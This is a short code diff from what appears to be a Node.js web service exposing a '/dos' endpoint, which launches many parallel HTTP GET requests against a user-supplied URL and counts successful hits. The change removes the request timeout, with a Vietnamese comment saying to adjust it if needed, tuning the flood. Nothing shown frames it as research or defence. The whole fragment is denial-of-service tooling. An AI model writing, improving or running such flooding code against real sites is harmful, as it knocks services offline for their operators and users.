@@ -46,7 +46,7 @@ app.post('/dos', (req, res) => {
             const attackPromises = [];
             for (let i = 0; i < threads; i++) {
                 attackPromises.push(
-                    axios.get(url)
+                    axios.get(url, { timeout: 0 }) // Thay đổi timeout nếu cần
                         .then(() => {
                             successfulRequests++;
                         })
